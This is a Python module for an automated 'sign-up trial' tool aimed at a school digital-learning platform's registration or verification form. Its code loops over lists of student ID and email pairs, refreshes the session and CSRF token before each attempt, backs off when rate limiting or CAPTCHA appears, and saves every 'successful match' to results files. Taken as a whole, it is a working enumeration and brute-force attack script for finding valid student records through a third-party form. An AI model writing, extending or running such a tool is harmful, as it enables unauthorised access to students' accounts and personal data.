# app/utils.py
"""
Digital Learning Platform Sign-Up Automation Engine
Orchestrates refreshed session trials with consistent matching ID to Email pairs.
"""

import os
import sys
import time
import json
import random
from datetime import datetime
import requests
import re

from app.settings import (
    DEFAULT_SCHOOLS,
    DEFAULT_PAIRS,
    DEFAULT_IDS,
    DEFAULT_DOMAINS,
    SUCCESS_MESSAGES,
    INCORRECT_MESSAGES,
    DEFAULT_TIMEOUT,
    DEFAULT_DELAY,
    DEFAULT_USER_AGENT,
    MAX_CONSECUTIVE_ERRORS,
    load_id_email_pairs,
    generate_pairs_from_pattern
)
from app.form_parser import extract_form_details, extract_csrf_token


def print_banner():
    print("""
===================================================================
      DIGITAL LEARNING SITE - SIGN-UP TRIAL TOOL
    Refreshed Session & Consistent Matching ID-to-Email Engine
===================================================================
[*] Target: Digital Learning Platform Sign-Up / Verification Form
[*] Inputs: School Name/Code | Student ID | Matching Student Email
[*] Refresh Mode: Full GET Refresh per trial with new CSRF / Cookies
===================================================================
""")


def extract_visible_text(html_text):
    """Strips <style>, <script>, and HTML tags to isolate visible response text."""
    text = re.sub(r'<style[^>]*>.*?</style>', ' ', html_text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<script[^>]*>.*?</script>', ' ', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    return ' '.join(text.split()).lower()


def evaluate_response(response, student_id, email, school):
    """
    Evaluates HTTP response text and status code to classify trial result.
    Returns: ('SUCCESS' | 'FAIL' | 'RATELIMIT' | 'UNKNOWN', message)
    """
    visible_text = extract_visible_text(response.text)
    text = visible_text
    raw_text = response.text.lower()
    status = response.status_code

    # Check for HTTP Rate Limiting / 429
    if status == 429 or "too many requests" in text or "rate limit" in text or "captcha" in text:
        return 'RATELIMIT', "Rate-limiting or CAPTCHA detected."

    # Check for explicit Success indicators
    for msg in SUCCESS_MESSAGES:
        if msg.lower() in visible_text:
            return 'SUCCESS', f"Matched success message: '{msg}'"

    # Common HTTP 302/303 redirect or success redirection clues
    if status in [302, 303]:
        location = response.headers.get("Location", "")
        if any(k in location.lower() for k in ["dashboard", "welcome", "verify", "success", "home"]):
            return 'SUCCESS', f"Redirected to success endpoint: {location}"

    # Check for explicit Failure indicators
    for msg in INCORRECT_MESSAGES:
        if msg.lower() in visible_text:
            return 'FAIL', f"Matched failure message: '{msg}'"

    # If HTTP 200 without known failure messages, inspect status
    if status == 200:
        if "error" in visible_text or "invalid" in visible_text or "not found" in visible_text or "mismatch" in visible_text:
            return 'FAIL', "Page indicated validation mismatch/error."
        return 'UNKNOWN', "Response returned 200 OK (ambiguous output, inspect manually)."

    return 'FAIL', f"HTTP Status {status}"


def save_result(school, student_id, email, note, output_file="results.txt"):
    """
    Saves successful / verified matching credentials to results files.
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = (
        f"--------------------------------------------------\n"
        f"[{timestamp}] SUCCESSFUL MATCH FOUND\n"
        f"School     : {school}\n"
        f"Student ID : {student_id}\n"
        f"Email      : {email}\n"
        f"Details    : {note}\n"
        f"--------------------------------------------------\n"
    )
    with open(output_file, "a", encoding="utf-8") as f:
        f.write(entry)

    # Also save structured JSON
    json_file = output_file.rsplit(".", 1)[0] + ".json"
    data = []
    if os.path.exists(json_file):
        try:
            with open(json_file, "r", encoding="utf-8") as jf:
                data = json.load(jf)
        except Exception:
            data = []
    data.append({
        "timestamp": timestamp,
        "school": school,
        "student_id": student_id,
        "email": email,
        "details": note
    })
    with open(json_file, "w", encoding="utf-8") as jf:
        json.dump(data, jf, indent=2)


def run_signup_trials(
    url,
    pairs,
    school,
    school_field="school",
    id_field="student_id",
    email_field="email",
    csrf_field=None,
    action_url=None,
    delay=DEFAULT_DELAY,
    stop_on_first_match=False,
    headers=None,
    output_file="results.txt"
):
    """
    Core execution loop:
    For every consistent matching (id, email) pair:
      1. Performs a fresh GET request to the sign-up URL to refresh session & CSRF tokens.
      2. Re-extracts updated CSRF token and hidden form fields.
      3. Constructs payload: { school_field: school, id_field: id, email_field: email, ... }
      4. Submits POST request.
      5. Analyzes response and logs progress.
    """
    if not action_url:
        action_url = url

    if not headers:
        headers = {
            "User-Agent": DEFAULT_USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": url
        }

    total_pairs = len(pairs)
    print(f"\n[*] Starting trials with {total_pairs} consistent matching ID-to-Email pairs.")
    print(f"[*] Target Sign-Up URL : {url}")
    print(f"[*] Submission Endpoint: {action_url}")
    print(f"[*] School             : {school}")
    print(f"[*] Fields Mapping     : School='{school_field}', ID='{id_field}', Email='{email_field}', CSRF='{csrf_field}'")
    print(f"[*] Refresh Cycle      : Fresh session GET before each trial")
    print(f"[*] Inter-trial Delay  : {delay}s\n")

    consecutive_errors = 0
    matches_found = 0

    for idx, (student_id, email) in enumerate(pairs, 1):
        # 1. Fresh session per trial: refreshes cookies, server session, and CSRF token
        session = requests.Session()
        session.headers.update(headers)

        print(f"\n[Trial {idx}/{total_pairs}] Refreshing sign-up page for matching pair -> ID: '{student_id}' | Email: '{email}'")

        fresh_csrf = ""
        hidden_payload = {}
        try:
            # Refresh sign-up page
            refresh_resp = session.get(url, timeout=DEFAULT_TIMEOUT)
            if refresh_resp.status_code != 200:
                print(f"  [!] Warning: Refresh GET returned status {refresh_resp.status_code}")

            # Extract fresh CSRF token and hidden inputs
            form_info = extract_form_details(refresh_resp.text, base_url=url)
            if form_info:
                hidden_payload.update(form_info.get("hidden_fields", {}))
                if csrf_field:
                    fresh_csrf = extract_csrf_token(refresh_resp.text, csrf_field)
                elif form_info.get("csrf_field"):
                    csrf_field = form_info.get("csrf_field")
                    fresh_csrf = extract_csrf_token(refresh_resp.text, csrf_field)
            else:
                if csrf_field:
                    fresh_csrf = extract_csrf_token(refresh_resp.text, csrf_field)

            consecutive_errors = 0
        except Exception as e:
            consecutive_errors += 1
            print(f"  [-] Error refreshing page: {e}")
            if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                print(f"[!] Too many consecutive network errors ({consecutive_errors}). Pausing for 5 seconds...")
                time.sleep(5)
            continue

        # 2. Build payload with school, matching ID, and matching email
        payload = dict(hidden_payload)
        if school_field:
            payload[school_field] = school
        payload[id_field] = student_id
        payload[email_field] = email

        if csrf_field and fresh_csrf:
            payload[csrf_field] = fresh_csrf
            print(f"  [>] Refreshed CSRF Token: {fresh_csrf[:15]}...")

        # 3. Submit trial sign-up POST
        try:
            post_headers = dict(headers)
            post_headers["Origin"] = url.split("://")[0] + "://" + url.split("://")[1].split("/")[0]
            post_headers["Referer"] = url

            post_resp = session.post(
                action_url,
                data=payload,
                headers=post_headers,
                timeout=DEFAULT_TIMEOUT,
                allow_redirects=True
            )

            status, note = evaluate_response(post_resp, student_id, email, school)

            if status == 'SUCCESS':
                matches_found += 1
                print(f"  [+] SUCCESS! Valid matching record found!")
                print(f"      School: {school} | ID: {student_id} | Email: {email}")
                print(f"      Response Note: {note}")
                save_result(school, student_id, email, note, output_file=output_file)
                if stop_on_first_match:
                    print("[*] 'Stop on first match' is enabled. Exiting trials.")
                    break

            elif status == 'RATELIMIT':
                backoff = random.uniform(5.0, 10.0)
                print(f"  [!] Rate limited or CAPTCHA encountered! Backing off for {backoff:.1f}s...")
                time.sleep(backoff)

            elif status == 'FAIL':
                print(f"  [-] Failed: {note} (ID: {student_id}, Email: {email})")

            else:
                print(f"  [?] Ambiguous response: {note} (Check {output_file})")

        except Exception as e:
            print(f"  [-] POST request error: {e}")

        # Rate-limiting courtesy delay
        if delay > 0 and idx < total_pairs:
            time.sleep(delay)

    print(f"\n===================================================================")
    print(f"[*] Trials completed. Total matches verified: {matches_found}/{total_pairs}")
    print(f"[*] Results saved to: {output_file}")
    print(f"===================================================================\n")
    return matches_found


def select_or_input_school():
    """Prompt user to choose from default schools or enter a custom school name/code."""
    print("\n[+] Select School:")
    if DEFAULT_SCHOOLS:
        for i, sch in enumerate(DEFAULT_SCHOOLS, 1):
            print(f"    {i}-) {sch}")
        print(f"    0-) Enter custom school name or code")
        try:
            choice = input("[+] Choice (or press Enter for #1): ").strip()
            if not choice or choice == "1":
                return DEFAULT_SCHOOLS[0]
            choice_num = int(choice)
            if 1 <= choice_num <= len(DEFAULT_SCHOOLS):
                return DEFAULT_SCHOOLS[choice_num - 1]
        except ValueError:
            pass
    custom = input("[+] Enter School Name / Identifier: ").strip()
    return custom or "Apex High School"


def setup_pairs_interactive():
    """Interactive selector for consistent matching ID to Email pairs."""
    print("\n[+] Matching ID-to-Email Configuration:")
    print("    1-) Use pre-configured pairs list (ressources/id_email_pairs.txt)")
    print("    2-) Load custom pairs file (CSV, colon-separated ID:Email, or tab-separated)")
    print("    3-) Generate consistent emails dynamically from ID list + School Domain")
    print("    4-) Enter a single ID and Email pair manually")

    mode = input("[+] Choice [1-4] (default 1): ").strip() or "1"

    if mode == "1":
        pairs = DEFAULT_PAIRS
        if not pairs:
            print("  [!] id_email_pairs.txt is empty. Falling back to dynamic generator.")
            mode = "3"
        else:
            return pairs

    if mode == "2":
        path = input("[+] Enter path to custom pairs file: ").strip()
        custom_pairs = load_id_email_pairs(path)
        if custom_pairs:
            print(f"  [+] Loaded {len(custom_pairs)} matching pairs from {path}")
            return custom_pairs
        else:
            print("  [!] Could not parse pairs from file. Falling back to defaults.")
            return DEFAULT_PAIRS

    if mode == "3":
        print("\n  [+] Dynamic Matching Email Generator:")
        domain = input(f"[+] Enter school email domain (e.g. 'student.apex.edu' or '{{id}}@student.apex.edu'): ").strip()
        if not domain:
            domain = DEFAULT_DOMAINS[0] if DEFAULT_DOMAINS else "student.apex.edu"
        ids = DEFAULT_IDS or ["STU-2024-001", "STU-2024-002", "STU-2024-003"]
        pairs = generate_pairs_from_pattern(ids, domain)
        print(f"  [+] Generated {len(pairs)} consistent pairs (Sample: {pairs[0][0]} -> {pairs[0][1]})")
        return pairs

    if mode == "4":
        sid = input("[+] Enter Student ID: ").strip() or "STU-2024-001"
        email = input("[+] Enter Matching Email: ").strip() or f"{sid}@student.apex.edu"
        return [(sid, email)]

    return DEFAULT_PAIRS


def automatic_mode():
    """Automatic field inspection and trial execution."""
    print("\n[+] --- AUTOMATIC MODE ---")
    url = input("[+] Enter target Digital Learning Sign-Up URL: ").strip()
    if not url:
        print("[-] Target URL cannot be empty!")
        return

    print("[*] Connecting and analyzing sign-up form fields...")
    try:
        session = requests.Session()
        session.headers.update({"User-Agent": DEFAULT_USER_AGENT})
        resp = session.get(url, timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        print(f"[-] Failed to reach URL: {e}")
        return

    form_info = extract_form_details(resp.text, base_url=url)
    if not form_info:
        print("[-] Could not find any <form> in the page. Please use Manual Mode.")
        return

    print("\n[+] Form Analysis Results:")
    print(f"    Submission Action: {form_info['action_url']}")
    print(f"    HTTP Method      : {form_info['method']}")
    print(f"    School Field     : {form_info['school_field'] or '[Not detected / Optional]'}")
    print(f"    Student ID Field : {form_info['id_field'] or '[Not detected - Needs manual input]'}")
    print(f"    Email Field      : {form_info['email_field'] or '[Not detected - Needs manual input]'}")
    print(f"    CSRF Token Field : {form_info['csrf_field'] or '[None / Hidden]'}")

    school_field = form_info['school_field']
    id_field = form_info['id_field']
    email_field = form_info['email_field']
    csrf_field = form_info['csrf_field']

    if not id_field:
        id_field = input("[+] Enter input name for Student ID field: ").strip()
    if not email_field:
        email_field = input("[+] Enter input name for Email field: ").strip()
    if not school_field:
        sch_in = input("[+] Enter input name for School field (leave blank if none): ").strip()
        school_field = sch_in if sch_in else None

    school = select_or_input_school() if school_field else "Default"
    pairs = setup_pairs_interactive()

    run_signup_trials(
        url=url,
        pairs=pairs,
        school=school,
        school_field=school_field,
        id_field=id_field,
        email_field=email_field,
        csrf_field=csrf_field,
        action_url=form_info['action_url']
    )

import re

def get_valid_url(prompt):
    """Keep prompting until a valid URL is entered."""
    while True:
        url = input(prompt).strip()
        if re.match(r'https?://', url):
            return url
        print(f"  [-] Invalid URL '{url}'. Please enter a full URL starting with http:// or https://")

def manual_mode():
    """Manual mode for customized field specification."""
    print("\n[+] --- MANUAL MODE ---")
    url = input("[+] Enter Target Sign-Up URL: ").strip()
    action_url = input("[+] Enter Form Action URL (leave blank to use Target URL): ").strip() or url
    school_field = input("[+] Enter School Field name (or leave blank if fixed/none): ").strip() or None
    id_field = input("[+] Enter Student ID Field name (default: 'student_id'): ").strip() or "student_id"
    email_field = input("[+] Enter Email Field name (default: 'email'): ").strip() or "email"
    csrf_field = input("[+] Enter CSRF Token Field name (leave blank if none): ").strip() or None

    school = select_or_input_school() if school_field else "Default"
    pairs = setup_pairs_interactive()

    run_signup_trials(
        url=url,
        pairs=pairs,
        school=school,
        school_field=school_field,
        id_field=id_field,
        email_field=email_field,
        csrf_field=csrf_field,
        action_url=action_url
    )
